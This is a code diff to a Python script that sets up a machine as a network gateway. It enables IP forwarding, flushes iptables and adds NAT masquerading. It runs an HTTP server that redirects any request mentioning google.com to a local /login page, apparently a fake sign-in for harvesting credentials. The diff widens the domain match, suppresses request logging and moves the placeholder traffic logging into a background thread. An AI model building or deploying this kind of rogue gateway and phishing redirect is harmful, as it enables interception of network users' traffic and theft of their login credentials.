@@ -2,6 +2,7 @@ import os
 import subprocess
 import json
 import time
+import threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 def enable_ip_forwarding():
@@ -9,24 +10,38 @@ def enable_ip_forwarding():
     try:
         with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
             f.write('1')
-        print("IP forwarding enabled.")
+        print("[+] IP forwarding enabled.")
     except PermissionError:
-        print("Permission denied: Run this script as root.")
+        print("[!] Permission denied: Run this script as root.")
+        exit(1)
+    except Exception as e:
+        print(f"[!] Error enabling IP forwarding: {e}")
         exit(1)
 
-def configure_iptables():
+def get_default_interface():
+    """Detect the default network interface."""
+    try:
+        result = subprocess.run(['ip', 'route', 'show', 'default'], capture_output=True, text=True, check=True)
+        interface = result.stdout.split()[-1]
+        print(f"[*] Detected interface: {interface}")
+        return interface
+    except:
+        print("[!] Could not detect interface. Falling back to 'eth0'. If this fails, specify manually.")
+        return "eth0"
+
+def configure_iptables(interface):
     """Set up NAT using iptables."""
     try:
+        print(f"[*] Configuring iptables for interface: {interface}")
+        subprocess.run(['sudo', 'iptables', '-F'], check=True)
+        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], check=True)
 
-        subprocess.run(['iptables', '-F'], check=True)
-        subprocess.run(['iptables', '-t', 'nat', '-F'], check=True)
+        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', interface, '-j', 'MASQUERADE'], check=True)
+        subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-i', interface, '-o', interface, '-j', 'ACCEPT'], check=True)
 
-        subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'], check=True)
-        subprocess.run(['iptables', '-A', 'FORWARD', '-i', 'eth0', '-o', 'eth0', '-j', 'ACCEPT'], check=True)
-
-        print("iptables rules configured.")
+        print("[+] iptables rules configured.")
     except subprocess.CalledProcessError as e:
-        print(f"Error configuring iptables: {e}")
+        print(f"[!] Error configuring iptables: {e}")
         exit(1)
 
 def log_traffic():
@@ -35,9 +50,11 @@ def log_traffic():
     os.makedirs(log_dir, exist_ok=True)
     log_file = os.path.join(log_dir, "network_traffic_log.json")
     try:
+        print(f"[*] Logging traffic to: {log_file}")
         with open(log_file, 'a') as f:
+            counter = 0
             while True:
-                # replace with actual traffic capture logic
+                # Placeholder: Replace with actual traffic capture logic
                 traffic_data = {
                     "timestamp": time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime()),
                     "source": "192.168.1.1",
@@ -47,9 +64,14 @@ def log_traffic():
                 }
                 json.dump(traffic_data, f)
                 f.write('\n')
-                time.sleep(1)  
+                counter += 1
+                if counter % 10 == 0:
+                    print(f"[*] Traffic entries logged: {counter}")
+                time.sleep(1)
     except KeyboardInterrupt:
-        print("Traffic logging stopped.")
+        print("\n[+] Traffic logging stopped.")
+    except Exception as e:
+        print(f"[!] Error in traffic logging: {e}")
 
 def start_http_server():
     """Start an HTTP server to handle requests and redirect to login page for specific domains."""
@@ -60,9 +82,9 @@ def start_http_server():
     class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
         def do_GET(self):
             client_ip = self.client_address[0]
-            print(f"Received GET request from {client_ip}")
+            print(f"[*] Received GET request from {client_ip}")
            
-            if "https://www.google.com/" in self.path:
+            if "google.com" in self.path.lower():
         
                 self.send_response(302)
                 self.send_header("Location", "/login")
@@ -105,22 +127,35 @@ def start_http_server():
                 self.send_header("Content-type", "text/html")
                 self.end_headers()
                 self.wfile.write(b"<html><body><h1>404 Not Found</h1></body></html>")
+        
+        def log_message(self, format, *args):
+            # Suppress default logging
+            pass
 
     server_address = ("", 8080)  # Listen on all interfaces, port 8080
     httpd = HTTPServer(server_address, CustomHTTPRequestHandler)
-    print("HTTP server running on port 8080...")
+    print("[+] HTTP server running on port 8080...")
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
-        print("HTTP server stopped.")
+        print("\n[+] HTTP server stopped.")
+    except Exception as e:
+        print(f"[!] HTTP server error: {e}")
 
 def main():
-    print("Setting up the computer as a network gateway...")
+    print("\n[*] Setting up the computer as a network gateway...")
+    print("[!] WARNING: This will modify your network configuration.")
+    print("[!] Make sure you have administrative privileges.\n")
+    
     enable_ip_forwarding()
-    configure_iptables()
-    print("Starting traffic logging...")
-    log_traffic()
-    print("Starting HTTP server...")
+    interface = get_default_interface()
+    configure_iptables(interface)
+    
+    print("\n[*] Starting traffic logging in background thread...")
+    traffic_thread = threading.Thread(target=log_traffic, daemon=True)
+    traffic_thread.start()
+    
+    print("[*] Starting HTTP server...\n")
     start_http_server()
 
 if __name__ == "__main__":
